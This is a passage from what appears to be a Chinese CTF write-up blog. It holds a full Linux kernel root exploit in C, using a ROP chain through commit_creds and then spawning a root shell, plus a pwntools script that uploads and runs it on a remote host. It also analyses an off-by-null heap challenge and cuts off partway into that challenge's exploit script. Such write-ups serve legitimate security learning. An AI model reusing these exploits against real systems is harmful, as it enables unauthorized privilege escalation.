title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff811cef9d</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = <span class="number">0xffffffff81e497c0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = <span class="number">0xffffffff810a1910</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs = <span class="number">0xffffffff81063844</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = <span class="number">0xffffffff81841297</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ret = <span class="number">0xffffffff8100006f</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *pointer_buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/test1&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open test1 error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/test1&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd1 &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open test1 error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write(fd1, buf, <span class="number">0x20</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    read(fd, buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (seq_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to create stat!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pointer_buf[<span class="number">0</span>] = <span class="number">0xffffffff81542a59</span>;</span><br><span class="line">    write(fd, pointer_buf, <span class="number">0x20</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   commit_creds\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   init_cred\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   pop_rdi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   ret\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   swapgs\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   iretq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   iretq\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xbeefdead\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd\n&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我之前的上传脚本有点问题，所以修改了一下，这里放一下以后方便拿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10101</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_file</span>(<span class="params">name, sym</span>):</span></span><br><span class="line">    file = read(name)</span><br><span class="line">    f = b64e(file)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>, <span class="number">1500</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(f) % (<span class="number">1500</span>-i) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    size = i</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(f))</span><br><span class="line">    r.sendlineafter(sym, <span class="string">&quot;cd /tmp&quot;</span>)</span><br><span class="line">    r.sendlineafter(sym, <span class="string">&quot;rm *&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f) // size + <span class="number">1</span>):</span><br><span class="line">        log.info(<span class="string">&quot;Sending chunk &#123;&#125;/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">len</span>(f)//size))</span><br><span class="line">        r.sendlineafter(</span><br><span class="line">            sym, <span class="string">&quot;echo -n &#x27;&#123;&#125;&#x27;&gt;&gt;/tmp/exp.gz.b64&quot;</span>.<span class="built_in">format</span>(f[i*<span class="number">967</span>:(i*<span class="number">967</span>)+<span class="number">967</span>]))</span><br><span class="line">    r.sendlineafter(sym, <span class="string">&quot;cat /tmp/exp.gz.b64 | base64 -d &gt;/tmp/exp.gz&quot;</span>)</span><br><span class="line">    r.sendlineafter(sym, <span class="string">&quot;gzip -d /tmp/exp.gz&quot;</span>)</span><br><span class="line">    r.sendlineafter(sym, <span class="string">&quot;chmod +x /tmp/exp&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">    sym = <span class="string">&quot;$&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(argv) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> argv[<span class="number">1</span>] == <span class="string">&quot;root&quot;</span>:</span><br><span class="line">            sym = <span class="string">&quot;#&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> argv[<span class="number">1</span>] == <span class="string">&quot;user&quot;</span>:</span><br><span class="line">            sym = <span class="string">&quot;$&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;user or root?&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    os.system(<span class="string">&#x27;rm exp.gz&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;cp ./exp ./exp.bak&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;gzip ./exp&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;mv exp.bak exp&#x27;</span>)</span><br><span class="line">    send_file(<span class="string">&quot;exp.gz&quot;</span>, sym=sym)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure><h2 id="fog"><a href="#fog" class="headerlink" title="fog"></a>fog</h2><p>一道比较简单的堆题，不过需要利用一点特性，恰好是我以往不知道的特性。</p><h3 id="fast-bin合并机制"><a href="#fast-bin合并机制" class="headerlink" title="fast bin合并机制"></a>fast bin合并机制</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在<code>_int_malloc</code>中存在一个我一直没有注意过的细节，可以看到如果我们malloc的size大于smallbin的size就会进行<code>malloc_consolidate</code>，也就是如果size位large bin范围就会进入合并。并且这一个特性在高版本的libc中也同样存在。</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这里题目比较简单，就是普通的菜单题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_B1B</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  LODWORD(result) = read(<span class="number">0</span>, a1, a2);</span><br><span class="line">  *((_BYTE *)a1 + (<span class="keyword">int</span>)result) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析发现这个函数存在off by null漏洞，在create和edit中都有调用。<br>这里还需要了解有另外两点，一是在进行fopen时会产生一个size位0x230的chunk </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且在close这里会free掉，还有就是在printf时会产生一个size位large bin范围的chunk，不过这一点我确实没找到相应源码，有师傅知道可以留言一下，并且我在自己写一个测试脚本时也没有产生，但是调试题目时发现确实存在一个size位0x410的chunk。</p><p>知道了上面的内容就很简单了，使用堆合并得到UAF的堆块，随后劫持<code>__malloc_hook</code>位one_gadget即可getshell</p><h3 id="综上，exp-1"><a href="#综上，exp-1" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./fog&#x27;</span>)</span><br><span class="line"><span class="comment"># r = 